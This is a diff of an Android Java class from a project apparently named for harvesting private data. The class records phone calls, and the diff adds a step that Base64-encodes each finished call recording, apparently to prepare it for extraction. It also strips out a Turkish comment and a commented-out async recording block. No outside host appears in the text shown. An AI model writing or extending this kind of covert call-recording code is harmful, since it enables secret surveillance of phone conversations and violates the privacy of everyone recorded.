@@ -10,6 +10,8 @@ import java.io.File;
 import java.io.IOException;
 import java.util.Date;
 
+import static com.vergermiya.harevost.fckurprivacy.Util.Base64Coder.file2Base64;
+
 public class CallRecordReceiver extends PhoneCallReceiver {
 
 
@@ -63,6 +65,7 @@ public class CallRecordReceiver extends PhoneCallReceiver {
     }
 
     protected void onRecordingFinished(Context context, CallRecord callRecord, File audioFile) {
+        file2Base64(audioFile);
     }
 
     private void startRecord(Context context, String seed, String phoneNumber) {
@@ -70,7 +73,6 @@ public class CallRecordReceiver extends PhoneCallReceiver {
             boolean isSaveFile = PrefsHelper.readPrefBool(context, CallRecord.PREF_SAVE_FILE);
             Log.i(TAG, "isSaveFile: " + isSaveFile);
 
-            // dosya kayıt edilsin mi?
             if (!isSaveFile) {
                 return;
             }
@@ -96,7 +98,6 @@ public class CallRecordReceiver extends PhoneCallReceiver {
                 } else {
                     releaseMediaRecorder();
                 }
-                //new MediaPrepareTask().execute(null, null, null);
             }
         } catch (IllegalStateException e) {
             e.printStackTrace();
@@ -221,30 +222,4 @@ public class CallRecordReceiver extends PhoneCallReceiver {
             recorder = null;
         }
     }
-
-    /*
-    class MediaPrepareTask extends AsyncTask<Void, Void, Boolean> {
-        @Override
-        protected Boolean doInBackground(Void... voids) {
-            if (prepareAudioRecorder(, "", "")) {
-                // Camera is available and unlocked, MediaRecorder is prepared,
-                // now you can start recording
-                recorder.start();
-                Log.i(TAG, "record start");
-            } else {
-                // prepare didn't work, release the camera
-                releaseMediaRecorder();
-                return false;
-            }
-            return true;
-        }
-
-        @Override
-        protected void onPostExecute(Boolean result) {
-            isRecordStarted = true;
-            onRecordingStarted(, callRecord, audiofile);
-        }
-    }
-    */
-
 }
